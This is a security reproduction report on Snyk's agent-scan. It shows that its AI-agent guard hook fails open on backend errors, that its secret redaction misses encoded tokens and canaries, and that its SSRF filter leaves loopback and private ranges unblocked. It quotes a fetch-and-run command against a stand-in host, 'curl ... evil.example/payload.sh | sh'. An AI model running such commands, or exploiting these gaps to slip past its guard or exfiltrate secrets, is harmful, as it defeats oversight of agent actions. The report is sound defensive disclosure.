# Snyk `agent-scan` (Invariant Labs) — Documented Hook Fail-Open, Redaction Coverage, & SSRF CIDR Scope

- **Upstream Repository:** `snyk/agent-scan`
- **Pinned Commit:** `6eb212583d044f40c8473f62b3e917029ef2cd22` (2026-11-13)
- **Inspected Files:**
  - `src/agent_scan/hooks/snyk-agent-guard.sh`
  - `src/agent_scan/redact.py`
  - `src/agent_scan/mcp_client.py`
- **Reproduction Script:** `test_guard_fail_open_and_redact_repro.py`
- **Evidence Log:** `evidence/reproduction.log`

## What this shows

Finding 1 is **documented, deliberate behavior**: the header of `snyk-agent-guard.sh` states that
transport and HTTP failures fail open (exit 0, a line on stderr, and a `systemMessage` telling the
user Agent Guard did not validate the action). It is listed here because in a deployment that
expects fail-closed enforcement, an unreachable or erroring backend lets the action run. Findings
2 and 3 are behaviors of the pinned commit; whether they are intended is for Snyk to say.

## Verified Findings

1. **`snyk-agent-guard.sh` fails open on HTTP errors (`4xx`/`5xx`) and transport failures** (`snyk-agent-guard.sh:68-75, 236-246`):
   - **Control:** Local mock backend returning `HTTP 200 {"decision":"block","reason":"dangerous bash"}` causes `--client claude-code` to emit `"decision":"block"`.
   - **Backend error:** Returning `HTTP 503` or `HTTP 401` causes the hook to log `failing open` to stderr, emit only a `systemMessage` without `"decision"`, and **exit `0`**, permitting dangerous commands such as `curl https://evil.example/payload.sh | sh`.
2. **`redact_args` misses encoded secrets and custom runtime canaries** (`src/agent_scan/redact.py`):
   - **Control:** `redact_args(["--body", "AKIAIOSFODNN7EXAMPLE"])` replaces the raw token with `**REDACTED_SECRET_AWSKEYDETECTOR**`.
   - **Not redacted:** `base64`, `hex`, `reversed`, and custom canary tokens (`CANARY-secret-99887766`) pass through completely unredacted.
3. **SSRF filter targets only 4 link-local/metadata CIDRs** (`src/agent_scan/mcp_client.py:45-77`):
   - `_create_mcp_http_client_without_redirects` raises `UnsafeMCPDestination` for `169.254.169.254`, while loopback (`127.0.0.1`) and RFC1918 (`10.0.0.5`) are absent from `_BLOCKED_MCP_NETWORKS` (and upstream code documents a residual DNS-rebinding TOCTOU window at line 77).
4. **Side-by-Side ADOM Behavior:**
   - Offline `ModelProxyPolicy(strict_deny_unknown=True)` + `adom.integrations.tool_guard.guard_mcp_handler` fail closed on unallowed tools and detect raw and encoded exfiltration (`base64`, `hex`, `reversed`, canary) locally with zero external network calls.

## How to Run

From the repository root (needs `git`, `bash`, `curl` and Python 3.11–3.13):

```bash
reproductions/run_reproduction.sh snyk-agent-scan
```

The script fetches `snyk/agent-scan` at the pinned commit into `reproductions/.work/snyk-agent-scan`, checks the commit hash, installs it into its own virtualenv (`reproductions/.work/venv-snyk-agent-scan`) and runs the test. Nothing outside `reproductions/.work/` is installed or changed. To rerun the test afterwards:

```bash
reproductions/.work/venv-snyk-agent-scan/bin/python -m unittest -v reproductions/snyk-agent-scan-guard-reproduction/test_guard_fail_open_and_redact_repro.py
```

Expected output (`evidence/reproduction.log`): `Ran 5 tests in 0.102s — OK`.

## Defensive Remediation

- Add a strict `--fail-closed` / block decision fallback in `snyk-agent-guard.sh` for non-2xx/timeout responses on high-risk tools (`Bash`, external network tools) plus offline local checks when the remote endpoint is unreachable.
- Canonicalize/decode common obfuscations (`base64`, `hex`, URL-encoding) and track dynamic session secrets alongside static `detect-secrets` detectors in `redact_args`.
- Expand SSRF IP blocking to loopback/RFC1918/ULA ranges unless explicitly allowlisted, pinning validated resolved IPs for the connection.
